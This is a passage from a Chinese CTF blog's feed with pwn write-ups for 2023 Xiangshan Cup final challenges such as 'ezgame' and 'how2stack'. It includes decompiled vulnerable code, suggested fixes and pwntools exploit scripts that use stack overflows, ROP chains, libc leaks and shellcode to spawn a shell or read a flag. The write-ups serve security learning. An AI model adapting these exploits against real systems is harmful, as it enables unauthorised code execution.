class="language-none">|63..32|31..16|15-8|7-0|               |AH.|AL.|               |AX.....|       |EAX............||RAX...................|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cdq</code>：把<code>edx</code>的所有位都设成<code>eax</code>最高位的值</p><p>最后<code>orw</code>会存在地址问题，将<code>rsp</code>设置正常即可</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''mov rdi, r15xor eax, eaxcdqmov al, 10mov dl, 7syscallxor eax, eaxmov esi, edimov edi, eaxmov dl, 0xffsyscall'''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'bytes shellcode'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        mov rsp, rsi        add rsp, 0x300        mov rcx, 0x2333500        mov dword ptr[rcx], 0x67616c66        mov rdi, rcx        mov rsi, 0        mov rdx, 0        mov rax, 2        syscall        mov rax, 0        mov rdi, 3        mov rsi, 0x2333300        mov rdx, 0x30        syscall        mov rax, 1        mov rdi, 1        mov rsi, 0x2333300        mov rdx, 0x30        syscall'''</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Elden-Ring-Ⅱ&quot;&gt;&lt;a href=&quot;#Elden-Ring-Ⅱ&quot; class=&quot;headerlink&quot; title=&quot;Elden Ring Ⅱ&quot;&gt;&lt;/a&gt;Elden Ring Ⅱ&lt;/h2&gt;&lt;p&gt;2.32的&lt;code&gt;uaf&lt;/code&gt;，漏洞点出现在&lt;c</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2023香山杯决赛-pwn</title>
    <link href="https://starrysky1004.github.io/2024/02/22/2023-xiang-shan-bei-jue-sai-pwn/"/>
    <id>https://starrysky1004.github.io/2024/02/22/2023-xiang-shan-bei-jue-sai-pwn/</id>
    <published>2024-02-22T11:59:11.000Z</published>
    <updated>2024-07-16T15:13:37.422Z</updated>
    
    <content type="html"><![CDATA[<p>题目下载地址：链接：<a href="https://pan.baidu.com/s/1s02lruOFCoBf8CUWpMg5qA?pwd=lays">https://pan.baidu.com/s/1s02lruOFCoBf8CUWpMg5qA?pwd=lays</a> </p><h2 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h2><p>检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ezgame  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2023/xiangshanbeijuesai/ezgame/pwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x3ff000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次砍龙会掉血，砍完血条没掉完就会掉金币，掉的金币可以去商店买道具去砍更高等级的龙，在<code>level2</code>砍成功了以后执行到<code>gets</code>，明显存在栈溢出漏洞，所以修复就是将这里的<code>gets</code>改成<code>read</code>之类的能够控制长度的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">switch</span> <span class="token punctuation">(</span> option <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>      <span class="token function">level3</span><span class="token punctuation">(</span><span class="token number">0x32u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">,</span> <span class="token number">0x14u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>      <span class="token function">level2</span><span class="token punctuation">(</span><span class="token number">0x64u</span><span class="token punctuation">,</span> <span class="token number">0x44Cu</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token number">0x1Eu</span><span class="token punctuation">,</span> <span class="token number">0xFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulations on defeating the dark sorcerer. Leave your name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment">// vuln</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token number">0</span><span class="token operator">:</span>      <span class="token function">level3</span><span class="token punctuation">(</span><span class="token number">0x1Eu</span><span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span><span class="token number">24804</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'What kind of monster do you want to fight?'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401a3b</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000401a39</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'What kind of monster do you want to fight?'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x650</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011D2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Congratulations on defeating the dark sorcerer. Leave your name!'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x0000000000401016</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'What kind of monster do you want to fight?'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x650</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Congratulations on defeating the dark sorcerer. Leave your name!'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="how2stack"><a href="#how2stack" class="headerlink" title="how2stack"></a>how2stack</h2><p>检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">how2stack  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2023/xiangshanbeijuesai/how2stack/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只实现了<code>decrypt</code>功能，也就是只能输入<code>1</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>  <span class="token function">init_0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">||</span> choice <span class="token operator">&amp;&amp;</span> choice <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Decrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>decrypt</code>函数中可以输入可控长度的内容，这里存在栈溢出漏洞，修复的话将这里读的长度控制成一个固定值就可以避免溢出了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>  len <span class="token operator">=</span> length<span class="token punctuation">;</span>  result <span class="token operator">=</span> length<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>length <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Data: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序一开始将<code>data</code>地址赋给了<code>res</code>，最终的输出也是输出<code>res</code>地址中的内容，而溢出也可以控制<code>res</code>，所以劫持了<code>res</code>中的值就可以输出指定地址的内容，如果没有控制<code>res</code>那<code>res</code>本身就是一个栈地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-70h] BYREF</span>  <span class="token keyword">char</span> chr<span class="token punctuation">;</span> <span class="token comment">// [rsp+63h] [rbp-Dh]</span>  <span class="token keyword">int</span> len<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp-Ch]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>res<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>  <span class="token function">init_1</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>string<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060<span class="token punctuation">,</span> qword_4010<span class="token punctuation">)</span><span class="token punctuation">;</span>  res <span class="token operator">=</span> data<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据这点，因为输出是根据地址中有内容就输出并且指向下一个地址，可以先将<code>res</code>前面的空间填充掉让<code>while</code>循环到<code>res</code>这个地址来输出<code>res</code>，也就是一个栈上的地址，寻找栈上存在<code>libc</code>的地址，替换掉<code>res</code>就可以输出<code>libc</code>中的地址，最后通过栈溢出控制程序流执行<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Length: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">0x8</span>add<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ff ff ff ff ff ff ff ff '</span><span class="token punctuation">)</span>stack <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Result in hex: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0xe3b01</span> <span class="token operator">+</span> libc_basepay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token 